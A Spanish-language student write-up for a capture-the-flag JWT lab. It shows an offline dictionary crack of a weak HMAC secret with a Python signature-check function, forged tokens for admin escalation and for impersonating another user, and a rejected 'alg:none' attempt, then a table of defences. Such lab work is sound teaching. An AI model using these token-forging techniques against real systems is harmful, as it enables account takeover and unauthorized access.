# Entregable — Lab Extra 5: JWT inseguro

**Grupo:** 05 · **Integrantes:**
- Magni, Gastón (@nosungam)
- Mosconi, Ignacio (@ignamosconi)
- Presuttari, Matías (@matiaspresuttari)
- Terreno, Valentino (@vterreno)

**Declaración de uso de IA:** Se utilizó un asistente de IA (DeepSeek) para
revisar la redacción del informe, ordenar las explicaciones y proponer el
esqueleto de algunas respuestas. El código de `jwt_tool.py` se implementó y se
ejecutó localmente, y cada salida que aparece en este informe se generó contra
el servidor del lab; las salidas crudas están en `evidencia/salidas/`. Las
fuentes del research se verificaron contra el documento original antes de
citarlas. El grupo revisó y comprendió cada afirmación antes de entregarla.

---

## 1. Anatomía del token real

Token obtenido con `GET /login?user=diego&pass=diego123` (guardado en
`evidencia/salidas/r1_login.json`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0MDY3MjE1LCJleHAiOjE3OTQwNzA4MTUsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.YBqE8MFbo4jyD5804qdjrFVEjJlJx4lBx3zZI6gVgYA
```

Decodificado con `python3 entregas/labextra5/grupo05/jwt_tool.py decodificar`:

```
HEADER:  {
  "alg": "HS256",
  "typ": "JWT"
}
PAYLOAD: {
  "sub": "diego",
  "role": "user",
  "iat": 1794067215,
  "exp": 1794070815,
  "nota_interna": "deploy-tag FLAG{jwt_solo_base64}"
}
FIRMA:   601a84f0c15ba388f20f9f34e2a763ac…
```

**R1 — claim problemático:** `nota_interna`. El token viaja en base64url, no
cifrado: cualquiera que lo vea (consola, logs, proxy, DevTools) lee el payload
completo y con él la flag `FLAG{jwt_solo_base64}`. La firma no protege la
confidencialidad. Además, el prefijo `deploy-tag` sugiere que se está filtrando
metadata de despliegue interna.

## 2. Crack offline del secreto

**El oráculo, en una oración:** dado un token válido, cada candidato de secreto
se prueba localmente recalculando `HMAC-SHA256(candidato, "cabecera.payload")` y
comparándolo con la firma del token; si coincide, el candidato es el secreto.

```python
def firma_es_valida(token: str, secreto: bytes) -> bool:
    try:
        cab, payload, firma = token.split(".")
    except ValueError:
        return False
    esperada = b64url(
        hmac.new(secreto, f"{cab}.{payload}".encode(), hashlib.sha256).digest()
    )
    # compare_digest evita filtrar por temporización en qué byte difiere.
    return hmac.compare_digest(firma, esperada)
```

`crackear_secreto()` recorre `caso/diccionario.txt` línea por línea y llama a
`firma_es_valida()` con cada palabra. No hay ninguna petición HTTP: el servidor
no participa y no puede rate-limitar, loguear ni bloquear nada.

- **Secreto encontrado:** `mate123` (`evidencia/salidas/r2_crackeo.txt`).
- **Candidatos probados:** 11. `mate123` es la línea 11 del diccionario; las 10
  anteriores (`password`, `123456`, `qwerty`, … `mate`) fallaron.
- **Tiempo:** ~0,02 s en total, incluyendo el arranque del intérprete Python.
  El costo real por candidato es una sola operación HMAC-SHA256 más una
  comparación; con 31 palabras el ataque es instantáneo.
- **¿Qué cambiaría con un secreto de 32 bytes aleatorios?** El diccionario
  dejaría de servir: el espacio de búsqueda pasa a 2^256 y no hay atajo. El
  ataque offline seguiría siendo *posible en teoría* (la firma es pública y se
  puede verificar localmente), pero dejaría de ser *factible*. La diferencia es
  de entropía, no de algoritmo: HMAC-SHA256 está bien; lo que estaba mal era la
  clave. Un secreto de diccionario convierte un espacio de 2^256 en uno de 31
  posibilidades.

## 3. Las dos forjas

### R2 — Escalada vertical (`role=admin`)

Token forjado con `jwt_tool.py forjar mate123 --sub diego --role admin`
(`evidencia/salidas/r2_token_admin.txt`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDA2NzIxNSwiZXhwIjoxNzk0MDcwODE1fQ.-ZG9UU2e9jacqozrPnGplmoAB4u1lFmOi9x0GOCg5iA
```

Respuesta de `/admin` con ese token (`evidencia/salidas/r2_admin_flag.txt`):

```
HTTP/1.0 200 OK
Content-Type: application/json; charset=utf-8

{"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
```

**Diff conceptual:** el token original tenía `"role": "user"`; el forjado tiene
`"role": "admin"`. También se quitaron `nota_interna` y se regeneraron `iat` y
`exp`. La firma cambió porque cambió el mensaje firmado. No se tocó el servidor
ni la cuenta: el servidor aceptó el token porque la firma era válida con el
secreto recuperado.

### R3 — Suplantación horizontal (`sub=maria`)

Token forjado con `--sub maria --role user` (`evidencia/salidas/r3_token_maria.txt`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtYXJpYSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0MDY3MjE1LCJleHAiOjE3OTQwNzA4MTV9.sWsirLt22Pab9BNCA0_RWXwe3CTCY_vxTjHyBflMelU
```

Respuesta de `/perfil` (`evidencia/salidas/r3_perfil_maria.txt`):

```
HTTP/1.0 200 OK
Content-Type: application/json; charset=utf-8

{"usuario": "maria", "role": "user", "datos": "Legajo 1007 — Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
```

**¿Por qué es un IDOR aunque no haya `?id=`?** Porque el identificador del
objeto no desapareció: se mudó al claim `sub`. `/perfil` toma `payload["sub"]` y
busca ese usuario sin comprobar que el sujeto autenticado sea el mismo que el
recurso pedido. En un IDOR clásico se cambia `?id=1042` por `?id=1007`; acá se
cambia `sub=diego` por `sub=maria` y se vuelve a firmar. La causa raíz es la
misma —falta de autorización a nivel de objeto—, pero el parámetro ahora está
dentro de una estructura que el servidor trata como identidad confiable. Como
el atacante tiene el secreto, puede fabricar cualquier identidad.

## 4. Control de sanidad

El servidor **sí rechaza** los tokens inválidos, lo que confirma que el éxito
anterior no fue un endpoint abierto sino una falla de la clave:

**(a) Token real de diego en `/admin` → 403** (`sanidad_admin_403.txt`):

```
HTTP/1.0 403 Forbidden

{"error": "solo administradores"}
```

**(b) Token forjado con un carácter cambiado en la firma → 401**
(`sanidad_firma_401.txt`):

```
HTTP/1.0 401 Unauthorized

{"error": "token invalido o expirado"}
```

También se probó `alg:none` con firma vacía (P4): el servidor respondió 401
(`p4_alg_none_401.txt`), porque verifica siempre HMAC-SHA256 y no confía en el
`alg` del header.

## 5. Preguntas P1–P5

### P1. Integridad vs. confidencialidad

La firma HMAC garantiza **integridad** y **autenticidad**: si el secreto es
fuerte, un cambio en header o payload invalida la firma, y solo quien conoce el
secreto puede emitir un token válido. No garantiza **confidencialidad**: el
payload es base64url, una codificación reversible sin clave. PhantomCorp tenía
integridad (mientras el secreto no se filtrara) y creía tener además
confidencialidad; en realidad el token era legible por cualquiera. Y como el
secreto era `mate123`, ni siquiera la integridad resistía: cualquiera podía
recalcular la firma. La frase "está firmado, no se puede tocar" confunde
"no se puede modificar sin detección" con "no se puede leer" y con "no se puede
falsificar".

### P2. Por qué el crack es offline y qué implica

Porque la verificación de una firma HMAC solo necesita el token y el candidato
de secreto; no hace falta preguntarle nada al servidor. El atacante consigue
**un** token válido (por ejemplo, con las credenciales de demo del propio
portal) y prueba todos los candidatos en su máquina. Implicaciones:

- **Sin límites:** no hay rate limit, ni lockout, ni CAPTCHA, ni MFA que frene
  el ataque; se pueden probar millones de candidatos por segundo.
- **Sin rastro:** el servidor no ve los intentos, así que no hay logs ni
  alertas. La detección por fuerza bruta online no aplica.
- **Contra un `/login` online** el defensor tiene palancas: throttling, bloqueo
  temporal de la cuenta, logs, geolocalización, MFA. Contra un secreto HMAC
  débil, ninguna de esas palancas sirve: la única defensa es que la clave tenga
  entropía suficiente (o usar un esquema asimétrico, donde el cliente solo tiene
  la clave pública de verificación y no puede firmar).

### P3. IDOR sin `?id=`: el control de acceso migra al token

En una app con sesión server-side, el servidor guarda "quién sos" y decide qué
objeto puede devolver. En JWT, en cambio, la identidad viaja en un claim que el
cliente presenta en cada request. Si el servidor hace `USUARIOS[payload["sub"]]`
sin contrastar ese `sub` contra una autorización server-side, el cliente elige
el objeto: el identificador pasó de `?id=` a `sub`. La firma no ayuda si el
atacante puede firmar. La defensa no es "ocultar el id", sino autorizar en el
servidor: el recurso solicitado debe pertenecer al sujeto autenticado, y los
claims deben usarse solo después de verificar la firma y dentro de una política
de autorización explícita. Los claims son datos que el cliente controla, no una
fuente de verdad de permisos.

### P4. `alg:none`

Se forjó un token con header `{"alg":"none","typ":"JWT"}`, payload con
`role=admin` y firma vacía. Este servidor lo **rechaza con 401** porque
`verificar()` ignora el `alg` del header y siempre recalcula
`HMAC-SHA256(SECRETO, "cab.pay")`; la firma vacía no coincide con la esperada.
Eso es lo correcto en el caso concreto, pero el diseño ideal no debería
depender de la casualidad: un servidor correcto debe **fijar** el algoritmo
permitido en su configuración (allowlist, por ejemplo solo HS256 o solo RS256),
rechazar explícitamente `none`, no aceptar el `alg` que propone el token y
validar que el tipo de clave corresponda al algoritmo. Esto también previene la
confusión RS256→HS256, donde el atacante pone `alg:HS256` y usa la clave pública
RSA como si fuera el secreto HMAC.

### P5. Defensas priorizadas para este portal

| Prioridad | Defensa | Ataque del lab que bloquea |
|---|---|---|
| 1 | **Secreto fuerte y aleatorio** (≥32 bytes de un CSPRNG), o directamente firma asimétrica | R2: el crack por diccionario deja de ser factible; sin secreto no hay forja |
| 2 | **Algoritmo fijado en el servidor** (`allowlist`: HS256, o RS256/EdDSA) y rechazo de `alg:none` | P4 y la confusión RS256→HS256; evita que el cliente elija cómo se verifica |
| 3 | **RS256/EdDSA** en arquitecturas con varios servicios: la clave privada queda solo en el emisor y los verificadores usan la pública | Hace estructuralmente inviable el crack offline por parte de un cliente o de un servicio comprometido: quien verifica no puede firmar |
| 4 | **Rotación de claves y `kid`** con solapamiento controlado | Limita la ventana de uso de un secreto filtrado; un token viejo deja de servir tras la rotación |
| 5 | **Claims mínimos**: nada de `nota_interna`, PII, connection strings ni secretos en el payload | R1: aunque el token se lea, no expone información sensible |
| 6 | **Expiración corta** y validación de `exp`, `nbf`, `iat`, `iss`, `aud` | Reduce el tiempo de vida de un token robado o forjado y evita reutilizarlo fuera del emisor/audiencia previstos |
| 7 | **Revocación** (`jti` + denylist, o sesiones server-side/refresh tokens cortos) | Permite cortar el acceso de un token ya emitido, cosa que la firma por sí sola no permite |
| 8 | **Autorización server-side por recurso** (no confiar en `role`/`sub` del token como única política) | R3: `/perfil` debe verificar que el `sub` autenticado sea el dueño del recurso, y `/admin` debe contrastar el rol contra una política del servidor |

La lección estructural es que **HS256 comparte el secreto entre quien firma y
quien verifica**. En un portal monolítico puede ser aceptable con una clave
fuerte, pero en microservicios cualquier servicio que verifique puede también
firmar. RS256/EdDSA separa esas capacidades: la privada firma, la pública
verifica, y un cliente comprometido no puede fabricar tokens.

## 6. Evidencia de progreso

Captura de `./ctf status extra5` (`evidencia/salidas/ctf_status.txt`):

```
  ╭────────────────────────────────────────────────────────────╮
  │                   PROGRESO · LAB extra5                    │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     El payload viaja en claro (base64 no es cifrado)
   ✓  R2     Secreto debil crackeado -> token forjado con role=admin
   ✓  R3     Suplantacion por claim: sub=maria (IDOR via JWT)

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra5 COMPLETO! Ponete las pilas con la próxima unidad.
```

La bitácora de comandos está en `evidencia/comandos.txt` y las salidas crudas
en `evidencia/salidas/`.
